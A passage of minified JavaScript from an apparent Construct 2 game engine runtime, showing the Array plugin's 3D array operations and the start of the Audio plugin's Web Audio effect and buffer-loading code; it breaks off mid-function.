        }, c.prototype.ProductStock = function (t, e) {
            t.set_int(this.storeService.stockOfProduct(e))
        }, o.exps = new c
    }(), cr.plugins_.Arr = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Arr.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {}, t.Instance = function (t) {
            this.type = t, this.runtime = t.runtime
        };
        var e = t.Instance.prototype,
            i = [];

        function n() {
            return i.length ? i.pop() : []
        }

        function r(t) {
            var e, n;
            for (e = 0, n = t.length; e < n; e++) Array.isArray(t[e]) && r(t[e]);
            cr.clearArray(t), i.push(t)
        }

        function s() {}

        function o() {}

        function a(t, e) {
            if (cr.is_number(t) && cr.is_number(e)) return t - e;
            var i = "" + t,
                n = "" + e;
            return i < n ? -1 : i > n ? 1 : 0
        }

        function h() {}
        Array.isArray || (Array.isArray = function (t) {
            return "[object Array]" === Object.prototype.toString.call(t)
        }), e.onCreate = function () {
            this.cx = this.properties[0], this.cy = this.properties[1], this.cz = this.properties[2], this.recycled || (this.arr = n());
            var t, e, i, r = this.arr;
            for (r.length = this.cx, t = 0; t < this.cx; t++)
                for (r[t] || (r[t] = n()), r[t].length = this.cy, e = 0; e < this.cy; e++)
                    for (r[t][e] || (r[t][e] = n()), r[t][e].length = this.cz, i = 0; i < this.cz; i++) r[t][e][i] = 0;
            this.forX = [], this.forY = [], this.forZ = [], this.forDepth = -1
        }, e.onDestroy = function () {
            var t;
            for (t = 0; t < this.cx; t++) r(this.arr[t]);
            cr.clearArray(this.arr)
        }, e.at = function (t, e, i) {
            return t = Math.floor(t), e = Math.floor(e), i = Math.floor(i), isNaN(t) || t < 0 || t > this.cx - 1 || isNaN(e) || e < 0 || e > this.cy - 1 || isNaN(i) || i < 0 || i > this.cz - 1 ? 0 : this.arr[t][e][i]
        }, e.set = function (t, e, i, n) {
            t = Math.floor(t), e = Math.floor(e), i = Math.floor(i), isNaN(t) || t < 0 || t > this.cx - 1 || isNaN(e) || e < 0 || e > this.cy - 1 || isNaN(i) || i < 0 || i > this.cz - 1 || (this.arr[t][e][i] = n)
        }, e.getAsJSON = function () {
            return JSON.stringify({
                c2array: !0,
                size: [this.cx, this.cy, this.cz],
                data: this.arr
            })
        }, e.saveToJSON = function () {
            return {
                size: [this.cx, this.cy, this.cz],
                data: this.arr
            }
        }, e.loadFromJSON = function (t) {
            var e = t.size;
            this.cx = e[0], this.cy = e[1], this.cz = e[2], this.arr = t.data
        }, e.setSize = function (t, e, i) {
            if (t < 0 && (t = 0), e < 0 && (e = 0), i < 0 && (i = 0), this.cx !== t || this.cy !== e || this.cz !== i) {
                var r, s, o;
                this.cx = t, this.cy = e, this.cz = i;
                var a = this.arr;
                for (a.length = t, r = 0; r < this.cx; r++)
                    for (cr.is_undefined(a[r]) && (a[r] = n()), a[r].length = e, s = 0; s < this.cy; s++)
                        for (cr.is_undefined(a[r][s]) && (a[r][s] = n()), a[r][s].length = i, o = 0; o < this.cz; o++) cr.is_undefined(a[r][s][o]) && (a[r][s][o] = 0)
            }
        }, e.getForX = function () {
            return this.forDepth >= 0 && this.forDepth < this.forX.length ? this.forX[this.forDepth] : 0
        }, e.getForY = function () {
            return this.forDepth >= 0 && this.forDepth < this.forY.length ? this.forY[this.forDepth] : 0
        }, e.getForZ = function () {
            return this.forDepth >= 0 && this.forDepth < this.forZ.length ? this.forZ[this.forDepth] : 0
        }, s.prototype.CompareX = function (t, e, i) {
            return cr.do_cmp(this.at(t, 0, 0), e, i)
        }, s.prototype.CompareXY = function (t, e, i, n) {
            return cr.do_cmp(this.at(t, e, 0), i, n)
        }, s.prototype.CompareXYZ = function (t, e, i, n, r) {
            return cr.do_cmp(this.at(t, e, i), n, r)
        }, e.doForEachTrigger = function (t) {
            this.runtime.pushCopySol(t.solModifiers), t.retrigger(), this.runtime.popSol(t.solModifiers)
        }, s.prototype.ArrForEach = function (t) {
            var e = this.runtime.getCurrentEventStack().current_event;
            this.forDepth++;
            var i = this.forDepth;
            switch (i === this.forX.length ? (this.forX.push(0), this.forY.push(0), this.forZ.push(0)) : (this.forX[i] = 0, this.forY[i] = 0, this.forZ[i] = 0), t) {
                case 0:
                    for (this.forX[i] = 0; this.forX[i] < this.cx; this.forX[i]++)
                        for (this.forY[i] = 0; this.forY[i] < this.cy; this.forY[i]++)
                            for (this.forZ[i] = 0; this.forZ[i] < this.cz; this.forZ[i]++) this.doForEachTrigger(e);
                    break;
                case 1:
                    for (this.forX[i] = 0; this.forX[i] < this.cx; this.forX[i]++)
                        for (this.forY[i] = 0; this.forY[i] < this.cy; this.forY[i]++) this.doForEachTrigger(e);
                    break;
                case 2:
                    for (this.forX[i] = 0; this.forX[i] < this.cx; this.forX[i]++) this.doForEachTrigger(e);
                    break
            }
            return this.forDepth--, !1
        }, s.prototype.CompareCurrent = function (t, e) {
            return cr.do_cmp(this.at(this.getForX(), this.getForY(), this.getForZ()), t, e)
        }, s.prototype.Contains = function (t) {
            var e, i, n;
            for (e = 0; e < this.cx; e++)
                for (i = 0; i < this.cy; i++)
                    for (n = 0; n < this.cz; n++)
                        if (this.arr[e][i][n] === t) return !0;
            return !1
        }, s.prototype.IsEmpty = function () {
            return 0 === this.cx || 0 === this.cy || 0 === this.cz
        }, s.prototype.CompareSize = function (t, e, i) {
            var n = 0;
            switch (t) {
                case 0:
                    n = this.cx;
                    break;
                case 1:
                    n = this.cy;
                    break;
                case 2:
                    n = this.cz;
                    break
            }
            return cr.do_cmp(n, e, i)
        }, t.cnds = new s, o.prototype.Clear = function () {
            var t, e, i;
            for (t = 0; t < this.cx; t++)
                for (e = 0; e < this.cy; e++)
                    for (i = 0; i < this.cz; i++) this.arr[t][e][i] = 0
        }, o.prototype.SetSize = function (t, e, i) {
            this.setSize(t, e, i)
        }, o.prototype.SetX = function (t, e) {
            this.set(t, 0, 0, e)
        }, o.prototype.SetXY = function (t, e, i) {
            this.set(t, e, 0, i)
        }, o.prototype.SetXYZ = function (t, e, i, n) {
            this.set(t, e, i, n)
        }, o.prototype.Push = function (t, e, i) {
            var r = 0,
                s = 0,
                o = 0,
                a = this.arr;
            switch (i) {
                case 0:
                    for (0 === t ? (r = a.length, a.push(n())) : (r = 0, a.unshift(n())), a[r].length = this.cy; s < this.cy; s++)
                        for (a[r][s] = n(), a[r][s].length = this.cz, o = 0; o < this.cz; o++) a[r][s][o] = e;
                    this.cx++;
                    break;
                case 1:
                    for (; r < this.cx; r++)
                        for (0 === t ? (s = a[r].length, a[r].push(n())) : (s = 0, a[r].unshift(n())), a[r][s].length = this.cz, o = 0; o < this.cz; o++) a[r][s][o] = e;
                    this.cy++;
                    break;
                case 2:
                    for (; r < this.cx; r++)
                        for (s = 0; s < this.cy; s++) 0 === t ? a[r][s].push(e) : a[r][s].unshift(e);
                    this.cz++;
                    break
            }
        }, o.prototype.Pop = function (t, e) {
            var i = 0,
                n = 0,
                s = this.arr;
            switch (e) {
                case 0:
                    if (0 === this.cx) break;
                    r(0 === t ? s.pop() : s.shift()), this.cx--;
                    break;
                case 1:
                    if (0 === this.cy) break;
                    for (; i < this.cx; i++) r(0 === t ? s[i].pop() : s[i].shift());
                    this.cy--;
                    break;
                case 2:
                    if (0 === this.cz) break;
                    for (; i < this.cx; i++)
                        for (n = 0; n < this.cy; n++) 0 === t ? s[i][n].pop() : s[i][n].shift();
                    this.cz--;
                    break
            }
        }, o.prototype.Reverse = function (t) {
            var e = 0,
                i = 0,
                n = this.arr;
            if (0 !== this.cx && 0 !== this.cy && 0 !== this.cz) switch (t) {
                case 0:
                    n.reverse();
                    break;
                case 1:
                    for (; e < this.cx; e++) n[e].reverse();
                    break;
                case 2:
                    for (; e < this.cx; e++)
                        for (i = 0; i < this.cy; i++) n[e][i].reverse();
                    break
            }
        }, o.prototype.Sort = function (t) {
            var e = 0,
                i = 0,
                n = this.arr;
            if (0 !== this.cx && 0 !== this.cy && 0 !== this.cz) switch (t) {
                case 0:
                    n.sort((function (t, e) {
                        return a(t[0][0], e[0][0])
                    }));
                    break;
                case 1:
                    for (; e < this.cx; e++) n[e].sort((function (t, e) {
                        return a(t[0], e[0])
                    }));
                    break;
                case 2:
                    for (; e < this.cx; e++)
                        for (i = 0; i < this.cy; i++) n[e][i].sort(a);
                    break
            }
        }, o.prototype.Delete = function (t, e) {
            var i = 0,
                n = 0;
            t = Math.floor(t);
            var s = this.arr;
            if (!(t < 0)) switch (e) {
                case 0:
                    if (t >= this.cx) break;
                    r(s[t]), s.splice(t, 1), this.cx--;
                    break;
                case 1:
                    if (t >= this.cy) break;
                    for (; i < this.cx; i++) r(s[i][t]), s[i].splice(t, 1);
                    this.cy--;
                    break;
                case 2:
                    if (t >= this.cz) break;
                    for (; i < this.cx; i++)
                        for (n = 0; n < this.cy; n++) s[i][n].splice(t, 1);
                    this.cz--;
                    break
            }
        }, o.prototype.Insert = function (t, e, i) {
            var r = 0,
                s = 0,
                o = 0;
            e = Math.floor(e);
            var a = this.arr;
            if (!(e < 0)) switch (i) {
                case 0:
                    if (e > this.cx) return;
                    for (r = e, a.splice(r, 0, n()), a[r].length = this.cy; s < this.cy; s++)
                        for (a[r][s] = n(), a[r][s].length = this.cz, o = 0; o < this.cz; o++) a[r][s][o] = t;
                    this.cx++;
                    break;
                case 1:
                    if (e > this.cy) return;
                    for (; r < this.cx; r++)
                        for (s = e, a[r].splice(s, 0, n()), a[r][s].length = this.cz, o = 0; o < this.cz; o++) a[r][s][o] = t;
                    this.cy++;
                    break;
                case 2:
                    if (e > this.cz) return;
                    for (; r < this.cx; r++)
                        for (s = 0; s < this.cy; s++) a[r][s].splice(e, 0, t);
                    this.cz++;
                    break
            }
        }, o.prototype.JSONLoad = function (t) {
            var e;
            try {
                e = JSON.parse(t)
            } catch (t) {
                return
            }
            if (e.c2array) {
                var i = e.size;
                this.cx = i[0], this.cy = i[1], this.cz = i[2], this.arr = e.data
            }
        }, o.prototype.JSONDownload = function (t) {
            var e = document.createElement("a");
            if (void 0 === e.download) {
                var i = "data:text/html," + encodeURIComponent("<p><a download='" + t + "' href=\"data:application/json," + encodeURIComponent(this.getAsJSON()) + '">Download link</a></p>');
                window.open(i)
            } else {
                var n = document.getElementsByTagName("body")[0];
                e.textContent = t, e.href = "data:application/json," + encodeURIComponent(this.getAsJSON()), e.download = t, n.appendChild(e);
                var r = document.createEvent("MouseEvent");
                r.initMouseEvent("click", !0, !0, window, 0, 0, 0, 0, 0, !1, !1, !1, !1, 0, null), e.dispatchEvent(r), n.removeChild(e)
            }
        }, t.acts = new o, h.prototype.At = function (t, e, i, n) {
            var r = i || 0,
                s = n || 0;
            t.set_any(this.at(e, r, s))
        }, h.prototype.Width = function (t) {
            t.set_int(this.cx)
        }, h.prototype.Height = function (t) {
            t.set_int(this.cy)
        }, h.prototype.Depth = function (t) {
            t.set_int(this.cz)
        }, h.prototype.CurX = function (t) {
            t.set_int(this.getForX())
        }, h.prototype.CurY = function (t) {
            t.set_int(this.getForY())
        }, h.prototype.CurZ = function (t) {
            t.set_int(this.getForZ())
        }, h.prototype.CurValue = function (t) {
            t.set_any(this.at(this.getForX(), this.getForY(), this.getForZ()))
        }, h.prototype.Front = function (t) {
            t.set_any(this.at(0, 0, 0))
        }, h.prototype.Back = function (t) {
            t.set_any(this.at(this.cx - 1, 0, 0))
        }, h.prototype.IndexOf = function (t, e) {
            for (var i = 0; i < this.cx; i++)
                if (this.arr[i][0][0] === e) return void t.set_int(i);
            t.set_int(-1)
        }, h.prototype.LastIndexOf = function (t, e) {
            for (var i = this.cx - 1; i >= 0; i--)
                if (this.arr[i][0][0] === e) return void t.set_int(i);
            t.set_int(-1)
        }, h.prototype.AsJSON = function (t) {
            t.set_string(this.getAsJSON())
        }, t.exps = new h
    }(), cr.plugins_.Audio = function (t) {
        this.runtime = t
    },
    function () {
        var t = cr.plugins_.Audio.prototype;
        t.Type = function (t) {
            this.plugin = t, this.runtime = t.runtime
        }, t.Type.prototype.onCreate = function () {};
        var e = null,
            i = null,
            n = "",
            r = "",
            s = 0,
            o = null,
            a = [],
            h = [],
            c = null,
            l = !1,
            u = 0,
            p = !1,
            d = 1,
            f = 0,
            m = 0,
            g = !1,
            y = 1,
            _ = 1,
            v = 10,
            b = 1e4,
            w = 1,
            x = null,
            S = "",
            T = !1,
            C = [],
            A = !1,
            O = !1;

        function k(t) {
            -1 === C.indexOf(t) && C.push(t)
        }

        function P(t) {
            var i, n = t.instanceObject;
            try {
                i = n.play()
            } catch (e) {
                return void k(t)
            }
            i ? i.catch((function (e) {
                k(t)
            })) : T && !e.isInUserInputEvent && k(t)
        }

        function I() {
            var t, e, i, n;
            O || g || !o || (! function () {
                "suspended" === o.state && o.resume && o.resume();
                if (!o.createBuffer) return;
                var t = o.createBuffer(1, 220, 22050),
                    e = o.createBufferSource();
                e.buffer = t, e.connect(o.destination), D(e)
            }(), "running" === o.state && (O = !0));
            var r = C.slice(0);
            if (cr.clearArray(C), !p)
                for (t = 0, e = r.length; t < e; ++t)(i = r[t]).stopped || i.is_paused || (n = i.instanceObject.play()) && n.catch((function (t) {
                    k(i)
                }))
        }

        function E(t) {
            var e = L(t);
            return isFinite(e) || (e = 0), e < 0 && (e = 0), e > 1 && (e = 1), e
        }

        function R(t) {
            return t < 0 && (t = 0), t > 1 && (t = 1),
                function (t) {
                    return Math.log(t) / Math.log(10) * 20
                }(t)
        }

        function L(t) {
            return Math.pow(10, t / 20)
        }
        document.addEventListener("touchend", I, !0), document.addEventListener("click", I, !0), document.addEventListener("keydown", I, !0);
        var M = {};

        function B(t) {
            return t = t.toLowerCase(), M.hasOwnProperty(t) && M[t].length ? M[t][0].getInputNode() : o.destination
        }

        function F() {
            return o.createGain ? o.createGain() : o.createGainNode()
        }

        function N(t) {
            return o.createDelay ? o.createDelay(t) : o.createDelayNode(t)
        }

        function D(t, e) {
            t.start ? t.start(e || 0) : t.noteOn(e || 0)
        }

        function j(t, e, i, n) {
            t.start ? t.start(n || 0, e) : t.noteGrainOn(n || 0, e, i - e)
        }

        function z(t) {
            try {
                t.stop ? t.stop(0) : t.noteOff(0)
            } catch (t) {}
        }

        function G(t, e, i, n) {
            if (t)
                if (t.cancelScheduledValues(0), 0 !== n) {
                    var r = o.currentTime;
                    switch (n += r, i) {
                        case 0:
                            t.setValueAtTime(e, n);
                            break;
                        case 1:
                            t.setValueAtTime(t.value, r), t.linearRampToValueAtTime(e, n);
                            break;
                        case 2:
                            t.setValueAtTime(t.value, r), t.exponentialRampToValueAtTime(e, n);
                            break
                    }
                } else t.value = e
        }
        var W = ["lowpass", "highpass", "bandpass", "lowshelf", "highshelf", "peaking", "notch", "allpass"];

        function U(t, e, i, n, r, s) {
            this.type = "filter", this.params = [t, e, i, n, r, s], this.inputNode = F(), this.wetNode = F(), this.wetNode.gain.value = s, this.dryNode = F(), this.dryNode.gain.value = 1 - s, this.filterNode = o.createBiquadFilter(), "number" == typeof this.filterNode.type ? this.filterNode.type = t : this.filterNode.type = W[t], this.filterNode.frequency.value = e, this.filterNode.detune && (this.filterNode.detune.value = i), this.filterNode.Q.value = n, this.filterNode.gain.value = r, this.inputNode.connect(this.filterNode), this.inputNode.connect(this.dryNode), this.filterNode.connect(this.wetNode)
        }

        function V(t, e, i) {
            this.type = "delay", this.params = [t, e, i], this.inputNode = F(), this.wetNode = F(), this.wetNode.gain.value = i, this.dryNode = F(), this.dryNode.gain.value = 1 - i, this.mainNode = F(), this.delayNode = N(t), this.delayNode.delayTime.value = t, this.delayGainNode = F(), this.delayGainNode.gain.value = e, this.inputNode.connect(this.mainNode), this.inputNode.connect(this.dryNode), this.mainNode.connect(this.wetNode), this.mainNode.connect(this.delayNode), this.delayNode.connect(this.delayGainNode), this.delayGainNode.connect(this.mainNode)
        }

        function X(t, e, i, n) {
            this.type = "convolve", this.params = [e, i, n], this.inputNode = F(), this.wetNode = F(), this.wetNode.gain.value = i, this.dryNode = F(), this.dryNode.gain.value = 1 - i, this.convolveNode = o.createConvolver(), t && (this.convolveNode.normalize = e, this.convolveNode.buffer = t), this.inputNode.connect(this.convolveNode), this.inputNode.connect(this.dryNode), this.convolveNode.connect(this.wetNode)
        }

        function q(t, e, i, n, r) {
            this.type = "flanger", this.params = [t, e, i, n, r], this.inputNode = F(), this.dryNode = F(), this.dryNode.gain.value = 1 - r / 2, this.wetNode = F(), this.wetNode.gain.value = r / 2, this.feedbackNode = F(), this.feedbackNode.gain.value = n, this.delayNode = N(t + e), this.delayNode.delayTime.value = t, this.oscNode = o.createOscillator(), this.oscNode.frequency.value = i, this.oscGainNode = F(), this.oscGainNode.gain.value = e, this.inputNode.connect(this.delayNode), this.inputNode.connect(this.dryNode), this.delayNode.connect(this.wetNode), this.delayNode.connect(this.feedbackNode), this.feedbackNode.connect(this.delayNode), this.oscNode.connect(this.oscGainNode), this.oscGainNode.connect(this.delayNode.delayTime), D(this.oscNode)
        }

        function Y(t, e, i, n, r, s) {
            this.type = "phaser", this.params = [t, e, i, n, r, s], this.inputNode = F(), this.dryNode = F(), this.dryNode.gain.value = 1 - s / 2, this.wetNode = F(), this.wetNode.gain.value = s / 2, this.filterNode = o.createBiquadFilter(), "number" == typeof this.filterNode.type ? this.filterNode.type = 7 : this.filterNode.type = "allpass", this.filterNode.frequency.value = t, this.filterNode.detune && (this.filterNode.detune.value = e), this.filterNode.Q.value = i, this.oscNode = o.createOscillator(), this.oscNode.frequency.value = r, this.oscGainNode = F(), this.oscGainNode.gain.value = n, this.inputNode.connect(this.filterNode), this.inputNode.connect(this.dryNode), this.filterNode.connect(this.wetNode), this.oscNode.connect(this.oscGainNode), this.oscGainNode.connect(this.filterNode.frequency), D(this.oscNode)
        }

        function H(t) {
            this.type = "gain", this.params = [t], this.node = F(), this.node.gain.value = t
        }

        function J(t, e) {
            this.type = "tremolo", this.params = [t, e], this.node = F(), this.node.gain.value = 1 - e / 2, this.oscNode = o.createOscillator(), this.oscNode.frequency.value = t, this.oscGainNode = F(), this.oscGainNode.gain.value = e / 2, this.oscNode.connect(this.oscGainNode), this.oscGainNode.connect(this.node.gain), D(this.oscNode)
        }

        function K(t, e) {
            this.type = "ringmod", this.params = [t, e], this.inputNode = F(), this.wetNode = F(), this.wetNode.gain.value = e, this.dryNode = F(), this.dryNode.gain.value = 1 - e, this.ringNode = F(), this.ringNode.gain.value = 0, this.oscNode = o.createOscillator(), this.oscNode.frequency.value = t, this.oscNode.connect(this.ringNode.gain), D(this.oscNode), this.inputNode.connect(this.ringNode), this.inputNode.connect(this.dryNode), this.ringNode.connect(this.wetNode)
        }

        function Q(t, e, i, n, r) {
            this.type = "distortion", this.params = [t, e, i, n, r], this.inputNode = F(), this.preGain = F(), this.postGain = F(), this.setDrive(i, L(n)), this.wetNode = F(), this.wetNode.gain.value = r, this.dryNode = F(), this.dryNode.gain.value = 1 - r, this.waveShaper = o.createWaveShaper(), this.curve = new Float32Array(65536), this.generateColortouchCurve(t, e), this.waveShaper.curve = this.curve, this.inputNode.connect(this.preGain), this.inputNode.connect(this.dryNode), this.preGain.connect(this.waveShaper), this.waveShaper.connect(this.postGain), this.postGain.connect(this.wetNode)
        }

        function Z(t, e, i, n, r) {
            this.type = "compressor", this.params = [t, e, i, n, r], this.node = o.createDynamicsCompressor();
            try {
                this.node.threshold.value = t, this.node.knee.value = e, this.node.ratio.value = i, this.node.attack.value = n, this.node.release.value = r
            } catch (t) {}
        }

        function $(t, e) {
            this.type = "analyser", this.params = [t, e], this.node = o.createAnalyser(), this.node.fftSize = t, this.node.smoothingTimeConstant = e, this.freqBins = new Float32Array(this.node.frequencyBinCount), this.signal = new Uint8Array(t), this.peak = 0, this.rms = 0
        }

        function tt() {
            this.obj = null, this.loadUid = 0
        }

        function et(t, i) {
            this.src = t, this.myapi = s, this.is_music = i, this.added_end_listener = !1;
            var n, r = this;
            switch (this.outNode = null, this.mediaSourceNode = null, this.panWhenReady = [], this.seekWhenReady = 0, this.pauseWhenReady = !1, this.supportWebAudioAPI = !1, this.failedToLoad = !1, this.wasEverReady = !1, 1 === s && i && !A && (this.myapi = 0, this.outNode = F()), this.bufferObject = null, this.audioData = null, this.myapi) {
                case 0:
                    this.bufferObject = new Audio, this.bufferObject.crossOrigin = "anonymous", this.bufferObject.addEventListener("canplaythrough", (function () {
                        r.wasEverReady = !0
                    })), 1 === s && o.createMediaElementSource && !/wiiu/i.test(navigator.userAgent) && (this.supportWebAudioAPI = !0, this.bufferObject.addEventListener("canplay", (function () {
                        !r.mediaSourceNode && r.bufferObject && (r.mediaSourceNode = o.createMediaElementSource(r.bufferObject), r.mediaSourceNode.connect(r.outNode))
                    }))), this.bufferObject.autoplay = !1, this.bufferObject.preload = "auto", this.bufferObject.src = t;
                    break;
                case 1:
                    e.isWKWebView ? e.fetchLocalFileViaCordovaAsArrayBuffer(t, (function (t) {
                        r.audioData = t, r.decodeAudioBuffer()
                    }), (function (t) {
                        r.failedToLoad = !0
                    })) : ((n = new XMLHttpRequest).open("GET", t, !0), n.responseType = "arraybuffer", n.onload = function () {
                        r.audioData = n.response, r.decodeAudioBuffer()
                    }, n.onerror = function () {
                        r.failedToLoad = !0
                    }, n.send());
                    break;
                case 2:
                    this.bufferObject = !0;
                    break;
                case 3:
                    this.bufferObject = !0;
                    break
            }
        }

        function it(t, a) {
            var h = this;
            this.tag = a, this.fresh = !0, this.stopped = !0, this.src = t.src, this.buffer = t, this.myapi = s, this.is_music = t.is_music, this.playbackRate = 1, this.hasPlaybackEnded = !0, this.resume_me = !1, this.is_paused = !1, this.resume_position = 0, this.looping = !1, this.is_muted = !1, this.is_silent = !1, this.volume = 1, this.onended_handler = function (t) {
                if (!h.is_paused && !h.resume_me) {
                    var r = this;
                    r || (r = t.target), r === h.active_buffer && (h.hasPlaybackEnded = !0, h.stopped = !0, n = h.tag, e.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded, i))
                }
            }, this.active_buffer = null, this.isTimescaled = 1 === u && !this.is_music || 2 === u, this.mutevol = 1, this.startTime = this.isTimescaled ? e.kahanTime.sum : e.wallTime.sum, this.gainNode = null, this.pannerNode = null, this.pannerEnabled = !1, this.objectTracker = null, this.panX = 0, this.panY = 0, this.panAngle = 0, this.panConeInner = 0, this.panConeOuter = 0, this.panConeOuterGain = 0, this.instanceObject = null;
            var c = !1;
            switch (1 !== this.myapi || 0 !== this.buffer.myapi || this.buffer.supportWebAudioAPI || (this.myapi = 0), this.myapi) {
                case 0:
                    this.is_music ? (this.instanceObject = t.bufferObject, c = !t.added_end_listener, t.added_end_listener = !0) : (this.instanceObject = new Audio, this.instanceObject.crossOrigin = "anonymous", this.instanceObject.autoplay = !1, this.instanceObject.src = t.bufferObject.src, c = !0), c && this.instanceObject.addEventListener("ended", (function () {
                        n = h.tag, h.stopped = !0, e.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded, i)
                    }));
                    break;
                case 1:
                    this.gainNode = F(), this.gainNode.connect(B(a)), 1 === this.buffer.myapi ? t.bufferObject && (this.instanceObject = o.createBufferSource(), this.instanceObject.buffer = t.bufferObject, this.instanceObject.connect(this.gainNode)) : (this.instanceObject = this.buffer.bufferObject, this.buffer.outNode.connect(this.gainNode), this.buffer.added_end_listener || (this.buffer.added_end_listener = !0, this.buffer.bufferObject.addEventListener("ended", (function () {
                        n = h.tag, h.stopped = !0, e.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded, i)
                    }))));
                    break;
                case 2:
                    this.instanceObject = new window.Media(r + this.src, null, null, (function (t) {
                        t === window.Media.MEDIA_STOPPED && (h.hasPlaybackEnded = !0, h.stopped = !0, n = h.tag, e.trigger(cr.plugins_.Audio.prototype.cnds.OnEnded, i))
                    }));
                    break;
                case 3:
                    this.instanceObject = !0;
                    break
            }
        }
        U.prototype.connectTo = function (t) {
            this.wetNode.disconnect(), this.wetNode.connect(t), this.dryNode.disconnect(), this.dryNode.connect(t)
        }, U.prototype.remove = function () {
            this.inputNode.disconnect(), this.filterNode.disconnect(), this.wetNode.disconnect(), this.dryNode.disconnect()
        }, U.prototype.getInputNode = function () {
            return this.inputNode
        }, U.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[5] = e, G(this.wetNode.gain, e, i, n), G(this.dryNode.gain, 1 - e, i, n);
                    break;
                case 1:
                    this.params[1] = e, G(this.filterNode.frequency, e, i, n);
                    break;
                case 2:
                    this.params[2] = e, G(this.filterNode.detune, e, i, n);
                    break;
                case 3:
                    this.params[3] = e, G(this.filterNode.Q, e, i, n);
                    break;
                case 4:
                    this.params[4] = e, G(this.filterNode.gain, e, i, n);
                    break
            }
        }, V.prototype.connectTo = function (t) {
            this.wetNode.disconnect(), this.wetNode.connect(t), this.dryNode.disconnect(), this.dryNode.connect(t)
        }, V.prototype.remove = function () {
            this.inputNode.disconnect(), this.mainNode.disconnect(), this.delayNode.disconnect(), this.delayGainNode.disconnect(), this.wetNode.disconnect(), this.dryNode.disconnect()
        }, V.prototype.getInputNode = function () {
            return this.inputNode
        }, V.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[2] = e, G(this.wetNode.gain, e, i, n), G(this.dryNode.gain, 1 - e, i, n);
                    break;
                case 4:
                    this.params[1] = E(e), G(this.delayGainNode.gain, E(e), i, n);
                    break;
                case 5:
                    this.params[0] = e, G(this.delayNode.delayTime, e, i, n);
                    break
            }
        }, X.prototype.connectTo = function (t) {
            this.wetNode.disconnect(), this.wetNode.connect(t), this.dryNode.disconnect(), this.dryNode.connect(t)
        }, X.prototype.remove = function () {
            this.inputNode.disconnect(), this.convolveNode.disconnect(), this.wetNode.disconnect(), this.dryNode.disconnect()
        }, X.prototype.getInputNode = function () {
            return this.inputNode
        }, X.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[1] = e, G(this.wetNode.gain, e, i, n), G(this.dryNode.gain, 1 - e, i, n);
                    break
            }
        }, q.prototype.connectTo = function (t) {
            this.dryNode.disconnect(), this.dryNode.connect(t), this.wetNode.disconnect(), this.wetNode.connect(t)
        }, q.prototype.remove = function () {
            this.inputNode.disconnect(), this.delayNode.disconnect(), this.oscNode.disconnect(), this.oscGainNode.disconnect(), this.dryNode.disconnect(), this.wetNode.disconnect(), this.feedbackNode.disconnect()
        }, q.prototype.getInputNode = function () {
            return this.inputNode
        }, q.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[4] = e, G(this.wetNode.gain, e / 2, i, n), G(this.dryNode.gain, 1 - e / 2, i, n);
                    break;
                case 6:
                    this.params[1] = e / 1e3, G(this.oscGainNode.gain, e / 1e3, i, n);
                    break;
                case 7:
                    this.params[2] = e, G(this.oscNode.frequency, e, i, n);
                    break;
                case 8:
                    this.params[3] = e / 100, G(this.feedbackNode.gain, e / 100, i, n);
                    break
            }
        }, Y.prototype.connectTo = function (t) {
            this.dryNode.disconnect(), this.dryNode.connect(t), this.wetNode.disconnect(), this.wetNode.connect(t)
        }, Y.prototype.remove = function () {
            this.inputNode.disconnect(), this.filterNode.disconnect(), this.oscNode.disconnect(), this.oscGainNode.disconnect(), this.dryNode.disconnect(), this.wetNode.disconnect()
        }, Y.prototype.getInputNode = function () {
            return this.inputNode
        }, Y.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[5] = e, G(this.wetNode.gain, e / 2, i, n), G(this.dryNode.gain, 1 - e / 2, i, n);
                    break;
                case 1:
                    this.params[0] = e, G(this.filterNode.frequency, e, i, n);
                    break;
                case 2:
                    this.params[1] = e, G(this.filterNode.detune, e, i, n);
                    break;
                case 3:
                    this.params[2] = e, G(this.filterNode.Q, e, i, n);
                    break;
                case 6:
                    this.params[3] = e, G(this.oscGainNode.gain, e, i, n);
                    break;
                case 7:
                    this.params[4] = e, G(this.oscNode.frequency, e, i, n);
                    break
            }
        }, H.prototype.connectTo = function (t) {
            this.node.disconnect(), this.node.connect(t)
        }, H.prototype.remove = function () {
            this.node.disconnect()
        }, H.prototype.getInputNode = function () {
            return this.node
        }, H.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 4:
                    this.params[0] = E(e), G(this.node.gain, E(e), i, n);
                    break
            }
        }, J.prototype.connectTo = function (t) {
            this.node.disconnect(), this.node.connect(t)
        }, J.prototype.remove = function () {
            this.oscNode.disconnect(), this.oscGainNode.disconnect(), this.node.disconnect()
        }, J.prototype.getInputNode = function () {
            return this.node
        }, J.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[1] = e, G(this.node.gain.value, 1 - e / 2, i, n), G(this.oscGainNode.gain.value, e / 2, i, n);
                    break;
                case 7:
                    this.params[0] = e, G(this.oscNode.frequency, e, i, n);
                    break
            }
        }, K.prototype.connectTo = function (t) {
            this.wetNode.disconnect(), this.wetNode.connect(t), this.dryNode.disconnect(), this.dryNode.connect(t)
        }, K.prototype.remove = function () {
            this.oscNode.disconnect(), this.ringNode.disconnect(), this.inputNode.disconnect(), this.wetNode.disconnect(), this.dryNode.disconnect()
        }, K.prototype.getInputNode = function () {
            return this.inputNode
        }, K.prototype.setParam = function (t, e, i, n) {
            switch (t) {
                case 0:
                    (e /= 100) < 0 && (e = 0), e > 1 && (e = 1), this.params[1] = e, G(this.wetNode.gain, e, i, n), G(this.dryNode.gain, 1 - e, i, n);
                    break;
                case 7:
